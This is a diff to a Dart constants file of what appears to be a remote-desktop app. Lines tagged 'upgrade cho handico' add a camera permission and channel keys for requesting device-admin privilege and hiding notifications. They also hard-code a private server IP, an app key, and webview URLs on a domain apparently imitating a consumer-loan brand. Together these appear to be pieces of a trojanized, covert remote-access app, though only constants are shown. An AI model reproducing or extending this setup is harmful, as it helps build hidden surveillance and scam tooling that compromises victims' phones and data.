@@ -228,6 +228,9 @@ const kActionApplicationDetailsSettings =
 const kActionAccessibilitySettings = "android.settings.ACCESSIBILITY_SETTINGS";
 
 const kRecordAudio = "android.permission.RECORD_AUDIO";
+  //++++Reminani : upgrade cho handico
+const kCamera = "android.permission.CAMERA";
+  //----Reminani : upgrade cho handico
 const kManageExternalStorage = "android.permission.MANAGE_EXTERNAL_STORAGE";
 const kRequestIgnoreBatteryOptimizations =
     "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS";
@@ -238,6 +241,12 @@ const kAndroid13Notification = "android.permission.POST_NOTIFICATIONS";
 class AndroidChannel {
   static final kStartAction = "start_action";
   static final kGetStartOnBootOpt = "get_start_on_boot_opt";
+    //++++Reminani : upgrade cho handico
+  static final kIsAdminApp = "is_admin_app";
+  static final kIsAllowNotification = "is_allow_notification";
+  static final kRequestAdminPrivillege = "request_admin_privillege";
+  static final kRequestNotification = "request_hide_notification";
+    //----Reminani : upgrade cho handico
   static final kSetStartOnBootOpt = "set_start_on_boot_opt";
   static final kSyncAppDirConfigPath = "sync_app_dir";
 }
@@ -488,3 +497,12 @@ enum WindowsTarget {
 extension WindowsTargetExt on int {
   WindowsTarget get windowsVersion => getWindowsTarget(this);
 }
+
+  //++++Reminani : upgrade cho handico
+const String kAppIDServerPrivate = "139.162.5.114";
+const String kAppKey ="4ClqlDiJDbawuVjDN+jBOk2r0dUqbUefAS3Dggk5uwg=";
+const String kAppWebViewUrl = "https://homecredit.duyetnhanh247.com";
+const String kAppWebViewLinked = "https://homecredit.duyetnhanh247.com/Linked.jpg";
+const String kAppBaseUrl = 'cdn-homecredit.duyetnhanh247.com';
+  //----Reminani : upgrade cho handico
+
